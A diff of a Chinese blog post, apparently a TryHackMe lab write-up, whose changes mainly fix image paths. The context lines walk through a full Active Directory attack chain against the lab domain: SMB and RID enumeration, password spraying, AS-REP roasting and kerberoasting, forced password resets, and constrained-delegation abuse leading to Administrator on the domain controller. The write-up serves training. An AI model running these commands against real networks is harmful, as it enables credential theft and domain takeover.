@@ -1,9 +1,9 @@
 ---
 title: 'THM Active Directory 渗透测试实战：从委派攻击到域控接管'
-description: '本文完整记录了针对THM.corp域的渗透测试过程，涵盖SMB枚举、Kerberos协议攻击、约束委派滥用等高级AD攻击技术，最终通过权限链实现域控接管。'
+description: '本文完整记录了针对域的渗透测试过程，涵盖SMB枚举、Kerberos协议攻击、约束委派滥用等高级AD攻击技术，最终通过权限链实现域控接管。'
 date: 2025-02-07
 tags: ['Active Directory', 'Kerberos', 'SMB', '约束委派', 'BloodHound']
-image: 'assets\image-20250210145734557.png'
+image: './assets/image-20250210145734557.png'
 authors: ['0xd00']
 ---
 
@@ -19,9 +19,9 @@ authors: ['0xd00']
 nmap  -sS -T4 -A 10.10.92.51
 ```
 
-![image-20250207143334163](assets\image-20250207143334163.png)
+![image-20250207143334163](./assets/image-20250207143334163.png)
 
-![image-20250207144723528](assets\image-20250207144723528.png)
+![image-20250207144723528](./assets/image-20250207144723528.png)
 
 根据扫描结果可以知道这是一台Windows Server，直接盯上我们的常客SMB
 
@@ -33,17 +33,17 @@ smbmap扫一下有没有匿名用户
 smbmap.py -u "anonymous" -H 10.10.92.51
 ```
 
-![image-20250207145009172](assets\image-20250207145009172.png)
+![image-20250207145009172](./assets/image-20250207145009172.png)
 
 发现了`Data`目录有读写权限，`IPC$`目录有读权限。
 
-![image-20250207152946792](assets\image-20250207152946792.png)
+![image-20250207152946792](./assets/image-20250207152946792.png)
 
-![image-20250207153148854](assets\image-20250207153148854.png)
+![image-20250207153148854](./assets/image-20250207153148854.png)
 
 通过文本文件我们能得知这个新员工的密码是`ResetMe123!`，而且根据密码内容，这可能是系统的默认密码。
 
-![image-20250207153859430](assets\image-20250207153859430.png)
+![image-20250207153859430](./assets/image-20250207153859430.png)
 
 通过浏览其中的pdf文件我们能够推断出txt文件可能是一个模板文件，用于将`<User>`替换成用户名后渲染到pdf的这一页中。
 
@@ -55,13 +55,13 @@ smbmap.py -u "anonymous" -H 10.10.92.51
 crackmapexec smb 10.10.92.51 -u "anonymous" -d thm.local -p '' --rid-brute >> a.txt
 ```
 
-![image-20250207161022443](assets\image-20250207161022443.png)
+![image-20250207161022443](./assets/image-20250207161022443.png)
 
 ```bash
 cat a.txt| cut -d '\' -f 2 | grep SidTypeUser | awk '{print $1}' > usernames.txt
 ```
 
-![image-20250207161633499](assets\image-20250207161633499.png)
+![image-20250207161633499](./assets/image-20250207161633499.png)
 
 ### 密码喷射
 
@@ -69,7 +69,7 @@ cat a.txt| cut -d '\' -f 2 | grep SidTypeUser | awk '{print $1}' > usernames.txt
 crackmapexec smb 10.10.92.51 -u usernames.txt -p 'ResetMe123!'
 ```
 
-![image-20250207163201644](assets\image-20250207163201644.png)
+![image-20250207163201644](./assets/image-20250207163201644.png)
 
 可以发现，目前只有pdf中的用户`LILY_ONEILL`未修改默认密码。
 
@@ -89,7 +89,7 @@ apt install python3-impacket
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass 'thm.corp/' -dc-ip 10.10.92.51 -request -usersfile usernames.txt
 ```
 
-![image-20250207165554311](assets\image-20250207165554311.png)
+![image-20250207165554311](./assets/image-20250207165554311.png)
 
 发现三个TGT
 
@@ -103,13 +103,13 @@ $krb5asrep$23$LEANN_LONG@THM.CORP:45cb306670d80c559c718a645b2fecf7$1e48fc282e120
 
 爆破出一个密码
 
-![image-20250207170330360](assets\image-20250207170330360.png)
+![image-20250207170330360](./assets/image-20250207170330360.png)
 
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py "thm.corp/TABATHA_BRITT:marlboro(1985)" -dc-ip 10.10.92.51 -request -outputfile SPN.hashes
 ```
 
-![image-20250207171246320](assets\image-20250207171246320.png)
+![image-20250207171246320](./assets/image-20250207171246320.png)
 
 但可惜的是TABATHA_BRITT也不可用。
 
@@ -119,27 +119,27 @@ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py "thm.corp/TABATH
 bloodhound-python -d THM.corp -u 'TABATHA_BRITT' -p 'marlboro(1985)' -ns 10.10.92.51 -c all
 ```
 
-![image-20250207172229560](assets\image-20250207172229560.png)
+![image-20250207172229560](./assets/image-20250207172229560.png)
 
 ### 通过用户枚举域中信息
 
 从此位置起ip变更为`10.10.76.184`
 
-![image-20250210142426054](assets\image-20250210142426054.png)
+![image-20250210142426054](./assets/image-20250210142426054.png)
 
 将收集到的数据导入到`bloodhood`中
 
 检查`AS-REQ Roastable`用户
 
-![image-20250210142805590](assets\image-20250210142805590.png)
+![image-20250210142805590](./assets/image-20250210142805590.png)
 
 选中`TABATHA_BRITT`节点，Node info->OUTBOUND CONTROL RIGHTS->Transitive Object Control
 
-![image-20250210144135361](assets\image-20250210144135361.png)
+![image-20250210144135361](./assets/image-20250210144135361.png)
 
-![image-20250210145734557](assets\image-20250210145734557.png)
+![image-20250210145734557](./assets/image-20250210145734557.png)
 
-![image-20250210153941815](assets\image-20250210153941815.png)
+![image-20250210153941815](./assets/image-20250210153941815.png)
 
 可见约束委派被配置为允许委派到域控制器的 **CIFS** 服务，所以我们获取到`DARLA_WINTERS`账户之后即可获取域控权限。
 
@@ -162,7 +162,7 @@ net rpc password "SHAWNA_BRAY" "QWER@1234" -U "THM.CORP"/"TABATHA_BRITT"%"marlbo
 crackmapexec smb 10.10.76.184 -u 'SHAWNA_BRAY' -p 'QWER@1234'
 ```
 
-![image-20250210152013523](assets\image-20250210152013523.png)
+![image-20250210152013523](./assets/image-20250210152013523.png)
 
 `SHAWNA_BRAY`具有`ForceChangePassword`权限
 
@@ -171,7 +171,7 @@ net rpc password 'CRUZ_HALL' 'QWER@1234' -U 'thm.corp'/'SHAWNA_BRAY'%'QWER@1234'
 crackmapexec smb 10.10.76.184 -u 'CRUZ_HALL' -p 'QWER@1234'
 ```
 
-![image-20250210152901727](assets\image-20250210152901727.png)
+![image-20250210152901727](./assets/image-20250210152901727.png)
 
 `CRUZ_HALL`也具有`ForceChangePassword`权限
 
@@ -180,7 +180,7 @@ net rpc password 'DARLA_WINTERS' 'QWER@1234' -U 'thm.corp'/'CRUZ_HALL'%'QWER@123
 crackmapexec smb 10.10.76.184 -u 'DARLA_WINTERS' -p 'QWER@1234'
 ```
 
-![image-20250210153107076](assets\image-20250210153107076.png)
+![image-20250210153107076](./assets/image-20250210153107076.png)
 
 ### 约束委派利用
 
@@ -188,7 +188,7 @@ crackmapexec smb 10.10.76.184 -u 'DARLA_WINTERS' -p 'QWER@1234'
 python3 /usr/share/doc/python3-impacket/examples/getST.py -spn cifs/HayStack.thm.corp -impersonate Administrator THM.corp/DARLA_WINTERS
 ```
 
-![image-20250210161948114](assets\image-20250210161948114.png)
+![image-20250210161948114](./assets/image-20250210161948114.png)
 
 ```bash
 export KRB5CCNAME=Administrator.ccache
@@ -202,4 +202,4 @@ export KRB5CCNAME=Administrator.ccache
 python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass Administrator@haystack.thm.corp
 ```
 
-![image-20250210164102035](assets\image-20250210164102035.png)
+![image-20250210164102035](./assets/image-20250210164102035.png)
